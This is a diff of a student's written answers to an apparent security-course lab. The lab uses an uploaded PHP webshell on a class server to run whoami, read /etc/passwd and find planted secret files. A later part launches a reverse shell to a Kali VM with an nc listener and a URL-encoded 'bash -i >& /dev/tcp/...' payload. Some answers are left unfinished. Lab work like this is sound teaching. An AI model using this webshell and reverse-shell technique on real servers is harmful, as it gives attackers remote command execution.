@@ -1,33 +1,53 @@
 David Toledo
 
 web shell
-1. Explain how you can execute the Linux command whoami on the server using your webshell. What result do you get when you execute that command?
+Explain how you can execute the Linux command whoami on the server using your webshell. What result do you get when you execute that command?
 
-we can access the webshell I uploaded by going to: http://danger.jeffondich.com/uploadedimages/toledod-webshell1.php
-this results in it simply echoing "No command requested."
+  we can access the webshell I uploaded by going to: http://danger.jeffondich.com/uploadedimages/toledod-webshell1.php
+  this results in it simply echoing "No command requested."
 
-by now doing: http://danger.jeffondich.com/uploadedimages/toledod-webshell1.php?command=whoami, I give it a command field, which activates the webshell and executes the command.
-this results in: www-data
+  by now doing: http://danger.jeffondich.com/uploadedimages/toledod-webshell1.php?command=whoami, I give it a command field, which activates   the webshell and executes the command.
+  this results in: www-data
 
-2. What is this webshell's <pre> tag for? (And more to the point, what happens if you leave it out?)
-the <pre> tag keeps whatever is within it in that exact format (pre-formated text), including the white space / new lines in it. This also effects how it is displayed, as the apparent change between the two comes from the font that the webshell gets displayed in.
+What is this webshell's <pre> tag for? (And more to the point, what happens if you leave it out?)
+  the <pre> tag keeps whatever is within it in that exact format (pre-formated text), including the white space / new lines in it. This also   effects how it is displayed, as the apparent change between the two comes from the font that the webshell gets displayed in.
 
 looking around:
 
-What directory is danger's website located in?
+  What directory is danger's website located in?
   /var/www/
-What are the names of all the user accounts on danger.jeffondich.com? How do you know?
+  What are the names of all the user accounts on danger.jeffondich.com? How do you know?
 
 
 Do you have access to the file /etc/passwd? What's in it?
-
+  Yes, the file contains the information of the users on the Kali computer, and information about them, ranging from UID, GID, home            directory and the user's shell.
 
 
 Do you have access to the file /etc/shadow? What's in it? (You'll have to look onliine for the answer to that second question, since the answer to the first is no.)
-
+  shadow will have the encrypted passwords for the users on the computer.
 
 
 There may be some secret files scattered around. See how many you can find and report on your discoveries.
 
-In secrets, there is a kindasecret.txt file which contains "Congratulations!" and an ASCII picture of a frog
-In youwontfindthiswithgobuster, there is a secret file that contains "Congratulations!" and an ASCII picture of birds
+  In secrets, there is a kindasecret.txt file which contains "Congratulations!" and an ASCII picture of a frog
+  In youwontfindthiswithgobuster, there is a secret file that contains "Congratulations!" and an ASCII picture of birds
+
+Launching Reverse Shell:
+
+
+What is the IP address of your Kali VM (the target machine)? How did you find out?
+  192.168.64.2, I found this out by in the terminal doing hostname -I to give me the IP address. 
+What are the IP addresses of your host OS (the attacking machine)? How did you find out? Which one should you use to communicate with Kali and why?
+  192.168.64.1, or 10.133.22.175
+  I would think I need to use the 192 one, as this matches the Kali IP address and would make connecting via nc possible. 
+On your host OS (the attacker), pick any port number between 5000 and 10000 and run nc -l -p YOUR_CHOSEN_PORT
+  5678
+
+Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?
+  I now have a shell in Kali, and I can tell because on my host OS, the terminal now shows: www-data@kali:/var/www/html$ which is kali, and if I do ls I can see my php file that I placed. 
+
+What are all those % codes in the URL you used?
+  http://KALI_IP/YOUR_WEBSHELL.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22
+  bash%20-c allows for
+Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.
+
